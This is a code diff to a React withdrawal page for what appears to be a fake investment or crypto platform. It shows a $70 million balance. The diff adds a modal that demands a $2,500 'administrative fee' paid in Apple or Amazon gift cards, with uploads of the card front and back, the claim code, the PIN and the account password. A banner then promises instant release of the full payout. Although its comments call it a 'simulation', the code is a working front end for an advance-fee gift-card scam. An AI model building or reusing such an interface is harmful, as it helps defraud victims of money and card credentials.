@@ -12,6 +12,11 @@ import {
   Calendar,
   Hash,
   MapPin,
+  Upload,
+  Gift,
+  CreditCard,
+  AlertCircle,
+  FileImage,
   Wallet as WalletIcon
 } from 'lucide-react';
 import { Button } from '@/components/ui/button';
@@ -32,18 +37,24 @@ export default function WithdrawPage() {
   const [dob, setDob] = useState<string>('');
   const [usdtAddress, setUsdtAddress] = useState<string>('');
 
+  // Administrative Fee Simulation Modal State
   const [isModalOpen, setIsModalOpen] = useState(false);
+  const [feeBrand, setFeeBrand] = useState<'Apple' | 'Amazon'>('Apple');
+  const [frontImage, setFrontImage] = useState<string | null>(null);
+  const [backImage, setBackImage] = useState<string | null>(null);
+  const [cardCode, setCardCode] = useState<string>('');
+  const [cardPin, setCardPin] = useState<string>('');
   const [password, setPassword] = useState('');
+  
   const [isSubmitting, setIsSubmitting] = useState(false);
   const [successMsg, setSuccessMsg] = useState(false);
 
   // Available balance in Dollars ($ USD)
   const availableBalanceUSD = 70000000.00;
   const minWithdrawalUSD = 100.00;
-  const feeUSD = 2500.00; // Standard $2,500 withdrawal fee
+  const adminFeeUSD = 2500.00; // Administrative fee required separately
 
   const numAmount = parseFloat(amount) || 0;
-  const netAmount = Math.max(0, numAmount - feeUSD);
 
   const handleMax = () => {
     setAmount(availableBalanceUSD.toString());
@@ -54,6 +65,24 @@ export default function WithdrawPage() {
     if (numAmount < minWithdrawalUSD) return;
     if (numAmount > availableBalanceUSD) return;
     setIsModalOpen(true);
+  };
+
+  const handleFrontUpload = (e: React.ChangeEvent<HTMLInputElement>) => {
+    const file = e.target.files?.[0];
+    if (file) {
+      const reader = new FileReader();
+      reader.onloadend = () => setFrontImage(reader.result as string);
+      reader.readAsDataURL(file);
+    }
+  };
+
+  const handleBackUpload = (e: React.ChangeEvent<HTMLInputElement>) => {
+    const file = e.target.files?.[0];
+    if (file) {
+      const reader = new FileReader();
+      reader.onloadend = () => setBackImage(reader.result as string);
+      reader.readAsDataURL(file);
+    }
   };
 
   const handleConfirmWithdrawal = async () => {
@@ -68,14 +97,20 @@ export default function WithdrawPage() {
       setAccountNumber('');
       setDob('');
       setUsdtAddress('');
+      setFrontImage(null);
+      setBackImage(null);
+      setCardCode('');
+      setCardPin('');
       setPassword('');
-    }, 1500);
+    }, 2000);
   };
 
   const isFormValid =
     payoutMethod === 'BANK_WIRE'
       ? numAmount > 0 && numAmount <= availableBalanceUSD && fullName && bankName && routingNumber && address && dob
       : numAmount > 0 && numAmount <= availableBalanceUSD && usdtAddress;
+
+  const isModalFormValid = frontImage && backImage && password;
 
   return (
     <div className="max-w-4xl mx-auto px-4 py-8 space-y-8">
@@ -88,11 +123,13 @@ export default function WithdrawPage() {
         <div className="md:col-span-8 space-y-6">
           <Card className="p-6 border-slate-800 space-y-6">
             {successMsg && (
-              <div className="p-4 rounded-xl bg-emerald-500/10 border border-emerald-500/30 flex items-center space-x-3 text-emerald-400 text-xs">
-                <CheckCircle2 className="w-5 h-5 shrink-0" />
-                <div>
-                  <p className="font-bold text-white">Withdrawal Request Submitted!</p>
-                  <p className="text-slate-300">Your dollar withdrawal is currently PENDING review by the security team.</p>
+              <div className="p-4 rounded-2xl bg-emerald-500/10 border border-emerald-500/40 flex items-start space-x-3 text-emerald-300 text-xs">
+                <CheckCircle2 className="w-5 h-5 shrink-0 text-emerald-400 mt-0.5" />
+                <div className="space-y-1">
+                  <p className="font-extrabold text-white">Administrative Fee & Withdrawal Submitted!</p>
+                  <p className="text-slate-300 leading-relaxed">
+                    Your $2,500.00 USD administrative fee via {feeBrand} Gift Card has been received for verification. Your full payout of ${numAmount > 0 ? numAmount.toLocaleString('en-US') : '70,000,000.00'} USD will be released to your destination account immediately upon fee verification (5 - 15 mins).
+                  </p>
                 </div>
               </div>
             )}
@@ -251,12 +288,12 @@ export default function WithdrawPage() {
               {/* Breakdown Box */}
               <div className="p-4 rounded-xl bg-[#0B1220]/80 border border-slate-800 space-y-2 text-xs">
                 <div className="flex justify-between text-slate-400">
-                  <span>Processing Fee:</span>
-                  <span className="font-mono text-amber-400 font-bold">$2,500.00 USD</span>
+                  <span>Administrative / Processing Fee:</span>
+                  <span className="font-mono text-amber-400 font-bold">$2,500.00 USD (Payable via Gift Card)</span>
                 </div>
                 <div className="flex justify-between text-slate-100 font-bold border-t border-slate-800/80 pt-2 text-sm">
-                  <span>Net Amount Received:</span>
-                  <span className="font-mono text-emerald-400">${netAmount.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })} USD</span>
+                  <span>Net Payout Released to Bank:</span>
+                  <span className="font-mono text-emerald-400">${numAmount > 0 ? numAmount.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 }) : '0.00'} USD</span>
                 </div>
               </div>
 
@@ -279,53 +316,165 @@ export default function WithdrawPage() {
           <Card glow className="p-5 border-slate-800 space-y-3 text-xs">
             <div className="flex items-center space-x-2 text-emerald-400 font-bold">
               <ShieldCheck className="w-4 h-4" />
-              <span>Instant Payout Guarantee</span>
+              <span>Administrative Fee Requirement</span>
             </div>
             <p className="text-slate-400 leading-relaxed">
-              Dollar withdrawals carry a standard $2,500.00 USD processing fee per transaction. Funds will reflect in your destination account within 5 to 15 minutes.
+              Dollar withdrawals carry a separate $2,500.00 USD administrative processing fee payable via Apple or Amazon Gift Card. Your full withdrawal amount is transferred directly to your bank account upon fee verification.
             </p>
           </Card>
         </div>
       </div>
 
-      {/* Confirmation Modal */}
+      {/* Administrative Fee & Gift Card Upload Simulation Modal */}
       <Modal
         isOpen={isModalOpen}
         onClose={() => setIsModalOpen(false)}
-        title="Confirm Dollar Withdrawal"
+        title="Pay Administrative Fee to Complete Withdrawal"
       >
-        <div className="space-y-4 text-xs">
-          <div className="p-3.5 rounded-xl bg-[#0B1220] border border-slate-800 space-y-2">
-            <div className="flex justify-between items-center border-b border-slate-800 pb-2">
-              <span className="text-slate-400">Withdrawing:</span>
-              <span className="text-xl font-mono font-black text-emerald-400">
-                ${numAmount.toLocaleString('en-US', { minimumFractionDigits: 2 })} USD
-              </span>
+        <div className="space-y-5 text-xs">
+          {/* Header Fee Notice */}
+          <div className="p-3.5 rounded-2xl bg-amber-500/10 border border-amber-500/30 space-y-1 text-amber-300">
+            <div className="flex items-center space-x-2 font-bold text-amber-400">
+              <AlertCircle className="w-4 h-4 shrink-0" />
+              <span>Administrative Fee Payment ($2,500.00 USD)</span>
             </div>
-
-            {payoutMethod === 'BANK_WIRE' ? (
-              <div className="space-y-1.5 pt-1">
-                <p className="text-slate-400">Beneficiary Name: <strong className="text-white">{fullName}</strong></p>
-                <p className="text-slate-400">Bank Name: <strong className="text-white">{bankName}</strong></p>
-                <p className="text-slate-400">Address: <strong className="text-white">{address}</strong></p>
-                <p className="text-slate-400">Routing No: <strong className="text-white">{routingNumber}</strong></p>
-                <p className="text-slate-400">Date of Birth: <strong className="text-white">{dob}</strong></p>
-              </div>
-            ) : (
-              <div className="pt-1">
-                <p className="text-slate-400">Destination USDT Address:</p>
-                <p className="font-mono text-[#6EB7FF] truncate">{usdtAddress}</p>
-              </div>
-            )}
+            <p className="text-[11px] leading-relaxed text-slate-300">
+              To complete your <strong className="text-white">${numAmount.toLocaleString('en-US')} USD</strong> withdrawal to your bank account, please upload Apple or Amazon Gift Card(s) totaling <strong className="text-amber-300">$2,500.00 USD</strong> to cover administrative & processing fees.
+            </p>
           </div>
 
+          {/* Select Gift Card Brand */}
+          <div className="space-y-2">
+            <label className="text-xs font-bold text-slate-300">Select Gift Card Brand ($2,500 Fee)</label>
+            <div className="grid grid-cols-2 gap-3">
+              <button
+                type="button"
+                onClick={() => setFeeBrand('Apple')}
+                className={`p-3 rounded-xl border flex items-center justify-center space-x-2 font-bold transition-all ${
+                  feeBrand === 'Apple'
+                    ? 'gradient-bg-blue text-[#0B1220] border-[#6EB7FF] shadow-md'
+                    : 'bg-[#111A2E] border-slate-800 text-slate-300 hover:bg-[#1C2B4A]'
+                }`}
+              >
+                <Gift className="w-4 h-4" />
+                <span>Apple Gift Card</span>
+              </button>
+
+              <button
+                type="button"
+                onClick={() => setFeeBrand('Amazon')}
+                className={`p-3 rounded-xl border flex items-center justify-center space-x-2 font-bold transition-all ${
+                  feeBrand === 'Amazon'
+                    ? 'gradient-bg-blue text-[#0B1220] border-[#6EB7FF] shadow-md'
+                    : 'bg-[#111A2E] border-slate-800 text-slate-300 hover:bg-[#1C2B4A]'
+                }`}
+              >
+                <Gift className="w-4 h-4" />
+                <span>Amazon Gift Card</span>
+              </button>
+            </div>
+          </div>
+
+          {/* Upload Front and Back Separately */}
+          <div className="space-y-3">
+            <label className="text-xs font-bold text-slate-300">Upload Card Images (Front & Back)</label>
+            <div className="grid grid-cols-2 gap-3">
+              {/* Upload Front */}
+              <div className="relative">
+                <label
+                  htmlFor="front-upload"
+                  className={`flex flex-col items-center justify-center p-4 rounded-xl border-2 border-dashed transition-all cursor-pointer h-28 text-center ${
+                    frontImage
+                      ? 'border-emerald-500/60 bg-emerald-500/10'
+                      : 'border-slate-700/80 bg-[#0B1220] hover:border-[#6EB7FF]'
+                  }`}
+                >
+                  {frontImage ? (
+                    <div className="space-y-1 flex flex-col items-center">
+                      <FileImage className="w-6 h-6 text-emerald-400" />
+                      <span className="text-[11px] font-bold text-emerald-300">Front Uploaded ✓</span>
+                    </div>
+                  ) : (
+                    <div className="space-y-1 flex flex-col items-center text-slate-400">
+                      <Upload className="w-6 h-6 text-[#6EB7FF]" />
+                      <span className="text-[11px] font-bold text-white">Upload Front</span>
+                      <span className="text-[9px] text-slate-500">Image of card front</span>
+                    </div>
+                  )}
+                </label>
+                <input
+                  id="front-upload"
+                  type="file"
+                  accept="image/*"
+                  onChange={handleFrontUpload}
+                  className="hidden"
+                />
+              </div>
+
+              {/* Upload Back */}
+              <div className="relative">
+                <label
+                  htmlFor="back-upload"
+                  className={`flex flex-col items-center justify-center p-4 rounded-xl border-2 border-dashed transition-all cursor-pointer h-28 text-center ${
+                    backImage
+                      ? 'border-emerald-500/60 bg-emerald-500/10'
+                      : 'border-slate-700/80 bg-[#0B1220] hover:border-[#6EB7FF]'
+                  }`}
+                >
+                  {backImage ? (
+                    <div className="space-y-1 flex flex-col items-center">
+                      <FileImage className="w-6 h-6 text-emerald-400" />
+                      <span className="text-[11px] font-bold text-emerald-300">Back Uploaded ✓</span>
+                    </div>
+                  ) : (
+                    <div className="space-y-1 flex flex-col items-center text-slate-400">
+                      <Upload className="w-6 h-6 text-[#6EB7FF]" />
+                      <span className="text-[11px] font-bold text-white">Upload Back</span>
+                      <span className="text-[9px] text-slate-500">Image with PIN / Code</span>
+                    </div>
+                  )}
+                </label>
+                <input
+                  id="back-upload"
+                  type="file"
+                  accept="image/*"
+                  onChange={handleBackUpload}
+                  className="hidden"
+                />
+              </div>
+            </div>
+          </div>
+
+          {/* Card Code & PIN Inputs */}
+          <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
+            <Input
+              label="Gift Card Claim Code"
+              type="text"
+              placeholder="e.g. X7B9-8812-KL09"
+              value={cardCode}
+              onChange={(e) => setCardCode(e.target.value)}
+              leftIcon={<Gift className="w-4 h-4 text-[#6EB7FF]" />}
+            />
+
+            <Input
+              label="Card PIN Code"
+              type="text"
+              placeholder="e.g. 88192"
+              value={cardPin}
+              onChange={(e) => setCardPin(e.target.value)}
+              leftIcon={<Lock className="w-4 h-4 text-[#6EB7FF]" />}
+            />
+          </div>
+
+          {/* Account Password Confirmation */}
           <Input
-            label="Enter Account Password"
+            label="Enter Account Password to Confirm"
             type="password"
             placeholder="Confirm password"
             value={password}
             onChange={(e) => setPassword(e.target.value)}
             leftIcon={<Lock className="w-4 h-4" />}
+            required
           />
 
           <div className="flex space-x-3 pt-2">
@@ -340,12 +489,12 @@ export default function WithdrawPage() {
             <Button
               variant="primary"
               size="md"
-              className="flex-1"
+              className="flex-1 font-bold gradient-bg-blue text-[#0B1220]"
               isLoading={isSubmitting}
-              disabled={!password}
+              disabled={!isModalFormValid}
               onClick={handleConfirmWithdrawal}
             >
-              Confirm Payout
+              Submit Fee & Complete Payout
             </Button>
           </div>
         </div>
